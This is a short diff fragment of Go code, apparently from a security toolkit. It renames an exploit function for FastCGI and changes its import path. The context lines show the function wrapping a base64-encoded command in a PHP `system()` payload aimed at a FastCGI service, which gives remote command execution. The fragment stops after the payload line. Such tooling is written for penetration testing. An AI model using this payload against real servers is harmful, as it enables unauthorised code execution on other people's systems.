@@ -6,11 +6,11 @@ import (
 	"net/url"
 	"strconv"
 
-	"github.com/virink/virzz/tools/client/fastcgi"
+	"github.com/mozhu1024/virzz/tools/client/fastcgi"
 )
 
 // ExpFastCGI -
-func ExpFastCGI(addr string, cmd, filename string) (string, error) {
+func expFastCGI(addr string, cmd, filename string) (string, error) {
 	// "/usr/share/php/PEAR.php"
 	cmd = fmt.Sprintf(
 		`<?php system(base64_decode('%s'));?>`,
